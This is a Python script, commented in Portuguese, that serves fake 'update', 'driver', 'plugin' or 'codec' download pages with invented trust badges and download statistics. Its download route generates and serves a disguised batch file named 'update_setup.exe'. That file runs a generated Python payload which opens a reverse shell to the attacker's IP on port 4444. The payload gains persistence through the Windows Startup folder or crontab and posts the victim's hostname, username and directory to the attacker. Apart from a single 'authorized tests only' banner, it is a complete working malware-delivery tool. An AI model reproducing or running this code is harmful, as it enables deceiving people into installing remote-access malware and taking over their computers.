#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import threading
import http.server
import socketserver
import random
import time
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# Configurações
PORT = 8080
HOST = "0.0.0.0"
DOWNLOAD_FILE = "update_setup.exe"
SHELL_SCRIPT = "shell_reverse.py"

# Cores para output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Template HTML da página de download
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{page_title}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }}
        
        body {{
            background: linear-gradient(135deg, {bg_gradient});
            color: #333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        
        .container {{
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            overflow: hidden;
            max-width: 800px;
            width: 100%;
        }}
        
        .header {{
            background: {header_bg};
            color: white;
            padding: 30px;
            text-align: center;
        }}
        
        .header h1 {{
            font-size: 28px;
            margin-bottom: 10px;
        }}
        
        .header p {{
            opacity: 0.9;
            font-size: 16px;
        }}
        
        .content {{
            padding: 40px;
        }}
        
        .update-info {{
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 25px;
            border-left: 4px solid {accent_color};
        }}
        
        .update-info h3 {{
            color: {accent_color};
            margin-bottom: 15px;
        }}
        
        .features {{
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 25px;
        }}
        
        .feature {{
            display: flex;
            align-items: center;
            gap: 10px;
        }}
        
        .feature i {{
            color: {accent_color};
            font-size: 18px;
        }}
        
        .download-section {{
            text-align: center;
            margin: 30px 0;
        }}
        
        .download-btn {{
            display: inline-block;
            background: {accent_color};
            color: white;
            padding: 16px 40px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            font-size: 18px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }}
        
        .download-btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
            background: {accent_hover};
        }}
        
        .security-badge {{
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
            color: #28a745;
            font-weight: 600;
        }}
        
        .stats {{
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 30px 0;
        }}
        
        .stat {{
            text-align: center;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
        }}
        
        .stat-number {{
            font-size: 24px;
            font-weight: bold;
            color: {accent_color};
        }}
        
        .footer {{
            background: #f8f9fa;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            color: #666;
        }}
        
        .verified {{
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 10px;
            color: #17a2b8;
        }}
        
        @media (max-width: 768px) {{
            .features {{
                grid-template-columns: 1fr;
            }}
            
            .stats {{
                grid-template-columns: 1fr;
            }}
        }}
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>{header_title}</h1>
            <p>{header_subtitle}</p>
        </div>
        
        <div class="content">
            <div class="update-info">
                <h3><i class="fas fa-info-circle"></i> Informações da Atualização</h3>
                <p>{update_description}</p>
            </div>
            
            <h3>Novas Funcionalidades:</h3>
            <div class="features">
                <div class="feature">
                    <i class="fas fa-shield-alt"></i>
                    <span>Melhorias de segurança</span>
                </div>
                <div class="feature">
                    <i class="fas fa-bolt"></i>
                    <span>Desempenho otimizado</span>
                </div>
                <div class="feature">
                    <i class="fas fa-bug"></i>
                    <span>Correção de bugs</span>
                </div>
                <div class="feature">
                    <i class="fas fa-plus"></i>
                    <span>Novos recursos</span>
                </div>
            </div>
            
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">+2M</div>
                    <div>Downloads</div>
                </div>
                <div class="stat">
                    <div class="stat-number">99.8%</div>
                    <div>Taxa de sucesso</div>
                </div>
                <div class="stat">
                    <div class="stat-number">4.9★</div>
                    <div>Avaliação</div>
                </div>
            </div>
            
            <div class="download-section">
                <a href="/download" class="download-btn">
                    <i class="fas fa-download"></i> Baixar Agora
                </a>
                <div class="security-badge">
                    <i class="fas fa-check-circle"></i>
                    Verificado e seguro • {file_size}
                </div>
            </div>
            
            <div class="verified">
                <i class="fas fa-shield-check"></i>
                Este arquivo foi verificado por nosso sistema de segurança
            </div>
        </div>
        
        <div class="footer">
            <p>{footer_text}</p>
            <p>{current_year} {company_name} • Todos os direitos reservados</p>
        </div>
    </div>
</body>
</html>
"""

# Templates de páginas diferentes
PAGE_TEMPLATES = {
    "update": {
        "page_title": "Atualização Disponível - {software_name}",
        "header_title": "Nova Atualização Disponível",
        "header_subtitle": "Melhorias de desempenho e segurança",
        "header_bg": "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
        "bg_gradient": "#667eea, #764ba2",
        "accent_color": "#667eea",
        "accent_hover": "#5a6fd8",
        "update_description": "Esta atualização crítica inclui importantes correções de segurança e melhorias de desempenho. Recomendamos instalar imediatamente.",
        "file_size": "15.2 MB",
        "footer_text": "Mantenha seu software sempre atualizado para garantir a melhor experiência e segurança.",
        "company_name": "TechSoft Solutions",
        "software_name": "Software Essential"
    },
    "driver": {
        "page_title": "Driver de Dispositivo - Atualização Necessária",
        "header_title": "Driver Atualizado Disponível",
        "header_subtitle": "Melhor compatibilidade e desempenho",
        "header_bg": "linear-gradient(135deg, #11998e 0%, #38ef7d 100%)",
        "bg_gradient": "#11998e, #38ef7d",
        "accent_color": "#11998e",
        "accent_hover": "#0e7f74",
        "update_description": "Seu dispositivo requer esta atualização de driver para funcionar corretamente e evitar problemas de compatibilidade.",
        "file_size": "8.7 MB",
        "footer_text": "Drivers atualizados garantem o melhor desempenho do seu hardware.",
        "company_name": "DeviceMaster Inc.",
        "software_name": "Driver Universal"
    },
    "plugin": {
        "page_title": "Plugin Necessário - {software_name}",
        "header_title": "Plugin Requerido para Conteúdo",
        "header_subtitle": "Instale para visualizar este conteúdo",
        "header_bg": "linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%)",
        "bg_gradient": "#ff6b6b, #ee5a52",
        "accent_color": "#ff6b6b",
        "accent_hover": "#e55a5a",
        "update_description": "Este plugin é necessário para visualizar o conteúdo corretamente. Instale-o para continuar.",
        "file_size": "3.5 MB",
        "footer_text": "Plugins adicionam funcionalidades essenciais ao seu software.",
        "company_name": "WebMedia Technologies",
        "software_name": "MediaView Plugin"
    },
    "codec": {
        "page_title": "Pacote de Codecs de Mídia",
        "header_title": "Codecs de Mídia Necessários",
        "header_subtitle": "Reproduza qualquer formato de mídia",
        "header_bg": "linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)",
        "bg_gradient": "#4facfe, #00f2fe",
        "accent_color": "#4facfe",
        "accent_hover": "#3d9be3",
        "update_description": "Este pacote de codecs permite reproduzir todos os formatos de áudio e vídeo populares.",
        "file_size": "12.8 MB",
        "footer_text": "Suporte completo a formatos de mídia com um único instalador.",
        "company_name": "MediaExperience Labs",
        "software_name": "Universal Codec Pack"
    }
}

class MaliciousHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Log da requisição
        self.log_request()
        
        # Página de download do arquivo malicioso
        if self.path == "/download":
            self.serve_malicious_file()
            return
            
        # Página principal
        if self.path == "/" or self.path == "/index.html":
            self.serve_main_page()
            return
            
        # Servir arquivos estáticos se existirem
        if self.path.endswith(('.css', '.js', '.png', '.jpg', '.ico')):
            super().do_GET()
            return
            
        # Página não encontrada
        self.send_error(404, "Página não encontrada")
        
    def serve_main_page(self):
        # Selecionar template aleatório
        template_key = random.choice(list(PAGE_TEMPLATES.keys()))
        template = PAGE_TEMPLATES[template_key]
        current_year = datetime.now().year
        
        # Gerar HTML personalizado
        html_content = HTML_TEMPLATE.format(
            page_title=template["page_title"].format(software_name=template["software_name"]),
            header_title=template["header_title"],
            header_subtitle=template["header_subtitle"],
            header_bg=template["header_bg"],
            bg_gradient=template["bg_gradient"],
            accent_color=template["accent_color"],
            accent_hover=template["accent_hover"],
            update_description=template["update_description"],
            file_size=template["file_size"],
            footer_text=template["footer_text"],
            current_year=current_year,
            company_name=template["company_name"]
        )
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
        
    def serve_malicious_file(self):
        try:
            # Verificar se o arquivo existe
            if not os.path.exists(DOWNLOAD_FILE):
                self.generate_malicious_file()
                
            # Servir o arquivo
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-Disposition', f'attachment; filename="{DOWNLOAD_FILE}"')
            self.send_header('Content-Length', os.path.getsize(DOWNLOAD_FILE))
            self.end_headers()
            
            with open(DOWNLOAD_FILE, 'rb') as f:
                self.wfile.write(f.read())
                
            # Log de download
            ip_address = self.client_address[0]
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"{Colors.GREEN}[+] {Colors.RESET}Download realizado - IP: {ip_address} - {timestamp}")
            
        except Exception as e:
            self.send_error(500, f"Erro ao servir arquivo: {str(e)}")
    
    def generate_malicious_file(self):
        """Gera o arquivo malicioso com shell reverso"""
        # Primeiro, criar o script Python do shell reverso
        shell_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import subprocess
import threading
import time
import requests

# Configurações do shell reverso
LHOST = "{self.get_local_ip()}"  # IP do atacante
LPORT = 4444                     # Porta do atacante

def reverse_shell():
    """Estabelece conexão reversa"""
    try:
        # Criar socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))
        
        # Redirecionar stdin, stdout, stderr
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Executar shell
        subprocess.call(["/bin/bash", "-i"] if os.name != "nt" else ["cmd.exe"])
        
    except Exception as e:
        # Tentar reconectar após falha
        time.sleep(60)
        reverse_shell()

def persistencia():
    """Adiciona persistência ao sistema"""
    try:
        if os.name == "nt":  # Windows
            # Adicionar à inicialização do Windows
            startup_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            bat_path = os.path.join(startup_dir, "system_update.bat")
            
            with open(bat_path, "w") as f:
                f.write(f"@echo off\\n")
                f.write(f"start /B pythonw \\"{os.path.abspath(__file__)}\\"\\n")
                
        else:  # Linux/Mac
            # Adicionar ao crontab
            cron_cmd = f"@reboot python3 {os.path.abspath(__file__)} >/dev/null 2>&1 &"
            os.system(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -')
            
    except:
        pass

def coletar_informacoes():
    """Coleta informações do sistema"""
    info = {{
        "sistema": os.name,
        "hostname": socket.gethostname(),
        "usuario": os.getenv("USERNAME") or os.getenv("USER"),
        "diretorio": os.getcwd()
    }}
    
    try:
        # Tentar enviar informações para servidor
        requests.post(f"http://{LHOST}:8000/info", json=info, timeout=5)
    except:
        pass

if __name__ == "__main__":
    # Coletar informações do sistema
    coletar_informacoes()
    
    # Adicionar persistência
    persistencia()
    
    # Iniciar shell reverso
    while True:
        try:
            reverse_shell()
        except:
            time.sleep(30)  # Esperar antes de tentar reconectar
'''

        # Salvar script do shell reverso
        with open(SHELL_SCRIPT, "w", encoding="utf-8") as f:
            f.write(shell_code)
            
        # Criar arquivo batch para Windows (que executa o script Python)
        batch_content = f'''@echo off
echo Instalando atualizacao...
timeout /t 3 /nobreak >nul
pythonw "{SHELL_SCRIPT}"
echo Atualizacao concluida com sucesso!
pause
'''
        
        # Salvar arquivo batch
        with open(DOWNLOAD_FILE, "w", encoding="utf-8") as f:
            f.write(batch_content)
            
        print(f"{Colors.GREEN}[+] {Colors.RESET}Arquivo malicioso gerado: {DOWNLOAD_FILE}")
        
    def get_local_ip(self):
        """Obtém o IP local da máquina"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
        
    def log_message(self, format, *args):
        # Personalizar logs
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = format % args
        
        # Exibir log colorido no console
        if "200" in message:
            color = Colors.GREEN
        elif "404" in message:
            color = Colors.RED
        else:
            color = Colors.YELLOW
            
        print(f"{color}[{timestamp}] {message}{Colors.RESET}")

class DownloadServer:
    def __init__(self):
        self.host = HOST
        self.port = PORT
        self.httpd = None
        
    def start_server(self):
        try:
            with socketserver.TCPServer((self.host, self.port), MaliciousHandler) as httpd:
                self.httpd = httpd
                print(f"{Colors.GREEN}[+] {Colors.RESET}Servidor iniciado em http://{self.host}:{self.port}")
                print(f"{Colors.GREEN}[+] {Colors.RESET}Página de download: http://{self.host}:{self.port}/download")
                print(f"{Colors.YELLOW}[!] {Colors.RESET}Configure o listener na porta 4444 para receber conexões")
                print(f"{Colors.YELLOW}[!] {Colors.RESET}Pressione Ctrl+C para parar o servidor")
                
                try:
                    httpd.serve_forever()
                except KeyboardInterrupt:
                    print(f"\n{Colors.RED}[-] {Colors.RESET}Parando servidor...")
                    
        except Exception as e:
            print(f"{Colors.RED}[-] {Colors.RESET}Erro ao iniciar servidor: {e}")
            
    def get_public_ip(self):
        try:
            import requests
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text
        except:
            return "Não disponível"

def main():
    print(f"""{Colors.PURPLE}
    ██████╗ █████╗ ██╗   ██╗███████╗███████╗███████╗        ██████╗ ██╗  ██╗███████╗██╗     ██╗     
    ██╔════╝██╔══██╗██║   ██║██╔════╝██╔════╝██╔════╝        ██╔══██╗██║  ██║██╔════╝██║     ██║     
    ██║     ███████║██║   ██║█████╗  █████╗  █████╗          ██████╔╝███████║█████╗  ██║     ██║     
    ██║     ██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══╝  ██╔══╝          ██╔═══╝ ██╔══██║██╔══╝  ██║     ██║     
    ╚██████╗██║  ██║ ╚████╔╝ ███████╗██║     ███████╗        ██║     ██║  ██║███████╗███████╗███████╗
    ╚═════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝     ╚══════╝        ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
    {Colors.RESET}""")
    
    print(f"{Colors.CYAN}    Gerador de Página de Download com Shell Reverso{Colors.RESET}")
    print(f"{Colors.CYAN}    ⚠️  APENAS PARA TESTES DE SEGURANÇA AUTORIZADOS ⚠️{Colors.RESET}\n")
    
    # Mostrar informações
    server = DownloadServer()
    local_ip = server.get_local_ip()
    public_ip = server.get_public_ip()
    
    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Local: {local_ip}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}IP Público: {public_ip}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Porta HTTP: {PORT}")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Porta Shell: 4444")
    print(f"{Colors.BLUE}[*] {Colors.RESET}Arquivo: {DOWNLOAD_FILE}\n")
    
    # Iniciar servidor
    server.start_server()

if __name__ == "__main__":
    main()
